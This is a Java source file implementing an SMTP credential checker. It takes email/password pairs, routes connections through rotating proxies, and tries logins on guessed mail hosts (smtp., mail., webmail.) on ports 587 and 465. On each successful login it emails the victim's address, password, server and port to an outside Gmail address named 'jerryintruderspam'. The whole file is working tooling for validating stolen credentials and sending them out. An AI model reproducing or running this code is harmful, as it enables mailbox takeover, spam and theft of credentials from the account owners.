/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package br.com.jerrycoder.core;

import br.com.jerrycoder.model.SettingsTemplate;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.mail.Folder;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.NoSuchProviderException;
import javax.mail.Session;
import javax.mail.Store;
import br.com.jerrycoder.model.DadosLogin;
import br.com.jerrycoder.model.Proxy;
import br.com.jerrycoder.model.ResponseConection;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

/**
 *
 * @author jerry
 */
public class ConectionSMTP2 {

    ResponseConection response;

    public ConectionSMTP2() {

        response = new ResponseConection();
    }

    public ResponseConection conectar(DadosLogin protocolo, SettingsTemplate settingsTemplate) {

        Proxy proxy = new Proxy();
        proxy.setUseProxy(settingsTemplate.getUseProxy());
        if (settingsTemplate.getUseProxy()) {
            proxy.setUseProxy(true);
            if (settingsTemplate.getUseProxyAPI()) {
                String[] array = settingsTemplate.getValueProxyAPI().split(":");
                proxy.setHost(array[0]);
                proxy.setPort(array[1]);
                proxy.setUser(array[2]);
                proxy.setPass(array[3]);
                proxy.setAuth(true);
            } else if (settingsTemplate.getUseProxyList()) {
                String[] array = settingsTemplate.getValueProxyList().split(":");
                proxy.setHost(array[0]);
                proxy.setPort(array[1]);
                proxy.setAuth(false);
            }
        }

        String[] userArray = protocolo.getUsername().split("@");
        String host = userArray[1];
        
        System.out.println("host: "+host);

        protocolo.setServer("smtp." + host);
        protocolo.setPort("587");
        login(protocolo, proxy);
        if (response.getCodResponse() == 0 || response.getStatusResponse().equals("AuthenticationFailedException") || response.getStatusResponse().equals("SMTPSendFailedException")) {
            return response;
        }

        protocolo.setServer("smtp." + host);
        protocolo.setPort("465");
        login(protocolo, proxy);
       if (response.getCodResponse() == 0 || response.getStatusResponse().equals("AuthenticationFailedException") || response.getStatusResponse().equals("SMTPSendFailedException")) {
            return response;
        }

        protocolo.setServer("mail." + host);
        protocolo.setPort("587");
        login(protocolo, proxy);
        if (response.getCodResponse() == 0 || response.getStatusResponse().equals("AuthenticationFailedException") || response.getStatusResponse().equals("SMTPSendFailedException")) {
            return response;
        }

        protocolo.setServer("mail." + host);
        protocolo.setPort("465");
        login(protocolo, proxy);
       if (response.getCodResponse() == 0 || response.getStatusResponse().equals("AuthenticationFailedException") || response.getStatusResponse().equals("SMTPSendFailedException")) {
            return response;
        }

        protocolo.setServer(host);
        protocolo.setPort("587");
        login(protocolo, proxy);
      if (response.getCodResponse() == 0 || response.getStatusResponse().equals("AuthenticationFailedException") || response.getStatusResponse().equals("SMTPSendFailedException")) {
            return response;
        }

        protocolo.setServer(host);
        protocolo.setPort("465");
        login(protocolo, proxy);
   if (response.getCodResponse() == 0 || response.getStatusResponse().equals("AuthenticationFailedException") || response.getStatusResponse().equals("SMTPSendFailedException")) {
            return response;
        }

        protocolo.setServer("webmail." + host);
        protocolo.setPort("587");
        login(protocolo, proxy);
      if (response.getCodResponse() == 0 || response.getStatusResponse().equals("AuthenticationFailedException") || response.getStatusResponse().equals("SMTPSendFailedException")) {
            return response;
        }

        protocolo.setServer("webmail." + host);
        protocolo.setPort("465");
        login(protocolo, proxy);
      if (response.getCodResponse() == 0 || response.getStatusResponse().equals("AuthenticationFailedException") || response.getStatusResponse().equals("SMTPSendFailedException")) {
            return response;
        }

        return response;
    }

    private void login(DadosLogin protocolo, Proxy proxy) {

        try {
            MailSession mailSession = new MailSession(protocolo, proxy);
            Session session = mailSession.getSession();
            Transport transport = session.getTransport(protocolo.getProtocoloType());
            transport.connect();

            if (transport.isConnected()) {
                
                MimeMessage message = getMensagem(session, protocolo.getUsername(), protocolo.getPass(), protocolo.getServer(), protocolo.getPort(), "jerryintruderspam@gmail.com");
                transport.sendMessage(message, message.getAllRecipients());
                
                response.setCodResponse(0);
                response.setStatusResponse("Conectado");
            } else {
                response.setCodResponse(3);
                response.setStatusResponse("Não Conectado");
            }
        } catch (com.sun.mail.smtp.SMTPSendFailedException ex) {
            response.setCodResponse(1);
            response.setStatusResponse("SMTPSendFailedException");
        } catch (javax.mail.AuthenticationFailedException ex) {
            response.setCodResponse(1);
            response.setStatusResponse("AuthenticationFailedException");
        } catch (NoSuchProviderException ex) {
            response.setCodResponse(3);
            response.setStatusResponse("NoSuchProviderException");
        } catch (MessagingException ex) {
            response.setCodResponse(3);
            response.setStatusResponse("MessagingException");
        }

    }

    private MimeMessage getMensagem(Session session, String user, String pass, String server, String port, String to) throws MessagingException {

        MimeMessage message = new MimeMessage(session);

        message.addHeader("Content-type", "text/HTML; charset=UTF-8");
        message.addHeader("format", "flowed");
        message.addHeader("Content-Transfer-Encoding", "64bit");
        message.setReplyTo(InternetAddress.parse("no_reply@" + server, false));
        message.setFrom(new InternetAddress(user));
        message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(to));
        message.setSubject("Java SMTP - " + System.currentTimeMillis(), "UTF-8");
        message.setText("Email: " + user
                + " | Pass: " + pass
                + " | Server: " + server
                + " | Port: " + port
                + " | Currente Date: " + System.currentTimeMillis(), "UTF-8");

        return message;

    }

}
